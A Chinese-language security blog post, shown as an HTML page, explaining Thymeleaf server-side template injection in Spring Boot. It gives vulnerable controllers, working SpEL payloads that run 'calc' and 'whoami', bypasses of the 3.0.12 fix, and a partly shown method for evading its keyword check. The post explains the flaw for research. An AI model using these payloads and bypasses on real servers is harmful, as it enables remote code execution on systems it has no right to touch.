@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Zh0um1" />
+  <meta name="description" content="摆烂仔的摆烂记录" />
+  
+  
+  <title>
+    
+      Thymeleaf SSTI 
+      
+      
+      |
+    
+     Zh0um1&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/f.png">
+    <link rel="icon" href="/images/f.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/a.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Zh0um1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Thymeleaf SSTI</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-10-04 15:29:58
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/SSTI/" title="SSTI">
+                    #SSTI
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Thymeleaf-基础"><a href="#Thymeleaf-基础" class="headerlink" title="Thymeleaf 基础"></a>Thymeleaf 基础</h1><p>在 html 文件中使用 Thymeleaf 需要先声明命名空间</p>
+<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre>
+
+<h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p><code>Thymeleaf</code> 提供了一些内置标签，通过标签来实现特定的功能</p>
+<table>
+<thead>
+<tr>
+<th>标签</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>th: id</td>
+<td>替换 id</td>
+<td><code>&lt;input th: id=&quot;$&#123;user.id&#125;&quot;/&gt;</code></td>
+</tr>
+<tr>
+<td>th: text</td>
+<td>文本替换</td>
+<td><code>&lt;p text:=&quot;$&#123;user.name&#125;&quot;&gt;bigsai&lt;/p&gt;</code></td>
+</tr>
+<tr>
+<td>th: utext</td>
+<td>支持 html 的文本替换</td>
+<td><code>&lt;p utext:=&quot;$&#123;htmlcontent&#125;&quot;&gt;content&lt;/p&gt;</code></td>
+</tr>
+<tr>
+<td>th: object</td>
+<td>替换对象</td>
+<td><code>&lt;div th: object=&quot;$&#123;user&#125;&quot;&gt;&lt;/div&gt;</code></td>
+</tr>
+<tr>
+<td>th: value</td>
+<td>替换值</td>
+<td><code>&lt;input th: value=&quot;$&#123;user.name&#125;&quot; &gt;</code></td>
+</tr>
+<tr>
+<td>th: each</td>
+<td>迭代</td>
+<td><code>&lt;tr th: each=&quot;student:$&#123;user&#125;&quot; &gt;</code></td>
+</tr>
+<tr>
+<td>th: href</td>
+<td>替换超链接</td>
+<td><code>&lt;a th: href=&quot;@&#123;index.html&#125;&quot;&gt;超链接&lt;/a&gt;</code></td>
+</tr>
+<tr>
+<td>th: src</td>
+<td>替换资源</td>
+<td><code>&lt;script type=&quot;text/javascript&quot; th: src=&quot;@&#123;index.js&#125;&quot;&gt;&lt;/script&gt;</code></td>
+</tr>
+</tbody></table>
+<h2 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h2><p>Thymeleaf 中以下几种表达式</p>
+<table>
+<thead>
+<tr>
+<th>表达式名字</th>
+<th>语法</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>变量取值</td>
+<td><code>$&#123;...&#125;</code></td>
+<td>获取请求域、session 域、对象等值</td>
+</tr>
+<tr>
+<td>选择变量</td>
+<td><code>*&#123;...&#125;</code></td>
+<td>获取上下文对象值</td>
+</tr>
+<tr>
+<td>消息</td>
+<td><code>#&#123;...&#125;</code></td>
+<td>获取国际化等值</td>
+</tr>
+<tr>
+<td>链接</td>
+<td><code>@&#123;...&#125;</code></td>
+<td>生成链接</td>
+</tr>
+<tr>
+<td>片段表达式</td>
+<td><code>~&#123;...&#125;</code></td>
+<td>jsp: include 作用，引入公共页面片段</td>
+</tr>
+</tbody></table>
+<p>Thymeleaf SSTI 是由片段表达式和预处理造成，所以重点说一下片段表达式</p>
+<h3 id="片段表达式"><a href="#片段表达式" class="headerlink" title="片段表达式"></a>片段表达式</h3><p>片段表达式可以用于引用公共的目标片段比如 footer 或者 header</p>
+<p>在 templates 目录下新建一个 <code>footer.html</code>，内容如下</p>
+<pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>fragment</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    This is a test footer
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+
+<p>在 index.html 中引用该片段</p>
+<pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Index Page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Hello Thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;name&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>insert</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>~&#123;footer::test&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+
+<p>最终效果如下</p>
+<p><img src="/posts/d8e592a0/Pasted-image-20220920161707.png" alt="Pasted-image-20220920161707.png"></p>
+<p>片段表达式语法如下</p>
+<ul>
+<li><code>~&#123;templatename:: selector&#125;</code>：会在 <code>/WEB-INF/templates/</code> 目录下寻找名为 <code>templatename</code> 的模版中定义的 fragment，如上面的 <code>~&#123;footer :: test&#125;</code> 就会从 <code>footer.html</code> 中寻找 <code>test</code> 片段</li>
+<li><code>~&#123;templatename&#125;</code>：引用整个 <code>templatename</code> 模版文件作为 <code>fragment</code></li>
+<li><code>~&#123;:: selector&#125;</code> 或 <code>~&#123;this:: selector&#125;</code>，引用来自同一模版文件名为 <code>selector</code> 的 <code>fragmnt</code></li>
+</ul>
+<p>其中 <code>selector</code> 可以是通过 <code>th: fragment</code> 定义的片段，也可以是类选择器、ID 选择器等</p>
+<p>若 <code>~&#123;&#125;</code> 片段表达式中出现 <code>:: </code>，则 <code>:: </code> 后需要有值，也就是 <code>selector</code></p>
+<h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>语法：<code>__$&#123;expression&#125;__</code></p>
+<p>官方文档中对其解释如下</p>
+<blockquote>
+<p>除了所有这些用于表达式处理的功能外，Thymeleaf 还具有预处理表达式的功能<br>预处理是在正常表达式之前完成的表达式的执行，允许修改最终将执行的表达式<br>预处理的表达式与普通表达式完全一样，但被双下划线符号（如 <code>__$&#123;expression&#125;__</code>）包围</p>
+</blockquote>
+<p>这也是出现 SSTI 问题的关键，预处理也可以解析执行表达式，也就是说找到一个可以控制预处理表达式的地方，让其解析执行我们的 payload 即可达到任意代码执行</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接使用 Spring Boot 快速搭建一个漏洞环境，注意指定 Thymeleaf 的版本</p>
+<p>在 pom.xml 中添加 Thymeleaf 并指定版本</p>
+<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>thymeleaf.version</span><span class="token punctuation">></span></span>3.0.11.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>thymeleaf.version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre>
+
+<h2 id="templatename"><a href="#templatename" class="headerlink" title="templatename"></a>templatename</h2><p>Controller</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">pathController</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> payload<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> payload<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>poc</p>
+<pre class="language-text" data-language="text"><code class="language-text">/path?payload=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x</code></pre>
+
+<p>通过 <code>__$&#123;&#125;__::.x</code> 构造表达式让 Thymeleaf 去执行</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由于 Controller 的返回值可控，返回结果为 <code>__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;__::.x</code>，这个结果会作为模板名称交给 Thymeleaf 模板引擎解析</p>
+<p>在 <code>ThymeleafView#renderFragment</code> 方法中会判断模板名称中是否含有 <code>:: </code>，如果包含了 <code>:: </code> 就会使用 <code>~&#123;viewTemplateName&#125;</code> 包裹后传入 <code>parseExpression</code> 方法中</p>
+<p><img src="/posts/d8e592a0/Pasted-image-20220920173315.png" alt="Pasted-image-20220920173315.png"></p>
+<p>一路跟进到 <code>StandardExpressionParser#parseExpression(org.thymeleaf.context.IExpressionContext, java.lang.String, boolean)</code> 方法中，这里面调用了预处理</p>
+<p><img src="/posts/d8e592a0/Pasted-image-20220920173950.png" alt="Pasted-image-20220920173950.png"></p>
+<p>在 <code>StandardExpressionPreprocessor#preprocess</code> 方法中，使用正则表达式 <code>\\_\\_(.*?)\\_\\_</code> 提取形如 <code>__matcher__</code> 字符串的 <code>matcher</code> 部分</p>
+<p>正则提取的部分作为 <code>expression</code>，调用其 <code>execute</code> 方法</p>
+<p><img src="/posts/d8e592a0/Pasted-image-20220920175650.png" alt="Pasted-image-20220920175650.png"></p>
+<p>经过层层调用，最后会走到 <code>SPELVariableExpressionEvaluator#evaluate</code> 中，造成 SpEL 注入</p>
+<p><img src="/posts/d8e592a0/Pasted-image-20220920180805.png" alt="Pasted-image-20220920180805.png"></p>
+<h2 id="URI-PATH"><a href="#URI-PATH" class="headerlink" title="URI PATH"></a>URI PATH</h2><p>Controller</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/uri/&#123;payload&#125;"</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">uriController</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> payload<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>poc</p>
+<pre class="language-text" data-language="text"><code class="language-text">/uri/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x</code></pre>
+
+<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>从 Spring MVC 视图解析流程中可以知道，Controller 的返回值会作为视图名称被封装到 ModelAndView 对象中，但这里的 <code>uriController</code> 没有返回值也正常得到了 ModeAndView 对象</p>
+<p>从 debug 的结果中也可以看到从 <code>ha.handler</code> 里返回的 ModeAndView 对象中 <code>view</code> 为 null</p>
+<p><img src="/posts/d8e592a0/Pasted-image-20220920205624.png" alt="Pasted-image-20220920205624.png"></p>
+<p>另外可以看到 <code>applyDefaultViewName</code> 方法对 ModelAndView 对象做了处理，一路跟进到 <code>DefaultRequestToViewNameTranslator#getViewName</code> 方法</p>
+<p>可以看到这里获取了请求的 URI，将其与前缀和后缀拼接后返回，在 <code>DispatcherServlet#applyDefaultViewName</code> 方法中被设置为 ModelAdnView 对象的视图名称</p>
+<p><img src="/posts/d8e592a0/Pasted-image-20220920205935.png" alt="Pasted-image-20220920205935.png"></p>
+<p>之后的流程就与 templatename 部分几乎相同了</p>
+<p>需要注意的是，使用上述 payload 拿到的 ViewName 是 <code>uri/__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;__:: </code>，在 <code>:: </code> 后面是没有 <code>.x</code> 的</p>
+<p>这是因为在 <code>DefaultRequestToViewNameTranslator#transformPath</code> 方法中通过 <code>StringUtils.stripFilenameExtension(path)</code> 去掉了后缀，也就是 <code>.x</code></p>
+<p><img src="/posts/d8e592a0/Pasted-image-20220920213245.png" alt="Pasted-image-20220920213245.png"></p>
+<p>没有 <code>.x</code> 不影响最后的代码执行，但是会无回显，绕过方式也很简单</p>
+<pre class="language-text" data-language="text"><code class="language-text">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()%7d__::xxxxx.aaaaa</code></pre>
+
+<p>因为 <code>StringUtils#stripFilenameExtension</code> 方法只会去掉最后的 <code>.</code> 及其后面的内容，前面的 <code>xxxxx</code> 会被保留</p>
+<h1 id="3-0-12-的修复与绕过"><a href="#3-0-12-的修复与绕过" class="headerlink" title="3.0.12 的修复与绕过"></a>3.0.12 的修复与绕过</h1><h2 id="检查视图名称"><a href="#检查视图名称" class="headerlink" title="检查视图名称"></a>检查视图名称</h2><p>修改 pom.xml 中 Thymeleaf 的版本为 <code>3.0.12.RELEASE</code>，再使用刚才的 poc 打会有如下的报错</p>
+<pre class="language-text" data-language="text"><code class="language-text">View name is an executable expression, and it is present in a literal manner in request path or parameters, which is forbidden for security reasons.</code></pre>
+
+<p>这是由于在 3.0.12 版本中，<code>ThymeleafView#renderFragment</code> 方法中，使用 <code>SpringRequestUtils#checkViewNameNotInRequest</code> 方法对请求路径与请求参数进行了检查，当这两者其中一个和传入的模板名称相同，就会抛出异常</p>
+<p><img src="/posts/d8e592a0/Pasted-image-20220920222553.png" alt="Pasted-image-20220920222553.png"></p>
+<p><img src="/posts/d8e592a0/Pasted-image-20220920222621.png" alt="Pasted-image-20220920222621.png"></p>
+<p>所以只需要令 <code>paramValue.contains(vn)</code> 返回 false 就可以绕过这个检查</p>
+<p>这里有两种绕过方式</p>
+<ul>
+<li><code>;/PAYLOAD</code></li>
+<li><code>//PAYLOAD</code></li>
+</ul>
+<p>第一种方式是因为在 SpringBoot 中，SpringBoot 有一个功能叫做矩阵变量，默认禁用，如果发现路径中存在分号，那么会调用 <code>removeSemicolonContent</code> 方法来移除分号</p>
+<p>第二种方式是将多余的 <code>/</code> 去掉</p>
+<p>需要注意的是这种绕过方式<strong>只适合 Restful 风格的 api <strong>和</strong>返回值存在路径拼接</strong>的 Controller</p>
+<h2 id="禁止-new-创建类和-T-创建静态类"><a href="#禁止-new-创建类和-T-创建静态类" class="headerlink" title="禁止 new 创建类和 T()创建静态类"></a>禁止 new 创建类和 T()创建静态类</h2><p>在 <code>SPELVariableExpressionEvaluator#getExpression</code> 方法中新增了 <code>SpringStandardExpressionUtils.containsSpELInstantiationOrStatic(spelExpression))</code> 来检查表达式中倒序检测是否包含 <code>wen</code> 关键字、在 <code>(</code> 的左边的字符是否是 <code>T</code>，如包含，那么认为找到了一个实例化对象，返回 <code>true</code>，阻止该表达式的执行</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">containsSpELInstantiationOrStatic</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> expression<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token comment">/*
+     * Checks whether the expression contains instantiation of objects ("new SomeClass") or makes use of
+     * static methods ("T(SomeClass)") as both are forbidden in certain contexts in restricted mode.
+     */</span>
+
+    <span class="token keyword">final</span> <span class="token keyword">int</span> explen <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> n <span class="token operator">=</span> explen<span class="token punctuation">;</span>
+    <span class="token keyword">int</span> ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// index for computing position in the NEW_ARRAY</span>
+    <span class="token keyword">int</span> si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> c<span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+        c <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">// When checking for the "new" keyword, we need to identify that it is not a part of a larger</span>
+        <span class="token comment">// identifier, i.e. there is whitespace after it and no character that might be a part of an</span>
+        <span class="token comment">// identifier before it.</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">&lt;</span> NEW_LEN
+                <span class="token operator">&amp;&amp;</span> c <span class="token operator">==</span> NEW_ARRAY<span class="token punctuation">[</span>ni<span class="token punctuation">]</span>
+                <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ni <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> explen<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isWhitespace</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            ni<span class="token operator">++</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">==</span> NEW_LEN <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// we found an object instantiation</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">continue</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token comment">// We 'restart' the matching counter just in case we had a partial match</span>
+            n <span class="token operator">+=</span> ni<span class="token punctuation">;</span>
+            ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token comment">// This has to be restarted too</span>
+                si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">continue</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token char">')'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            si <span class="token operator">=</span> n<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">></span> n <span class="token operator">&amp;&amp;</span> c <span class="token operator">==</span> <span class="token char">'('</span>
+                    <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'T'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">></span> n <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>因此要绕过这个函数，只要满足三点：</p>
+<ol>
+<li>表达式中不能含有关键字 <code>new</code></li>
+<li>在 <code>(</code> 的左边的字符不能是 <code>T</code></li>
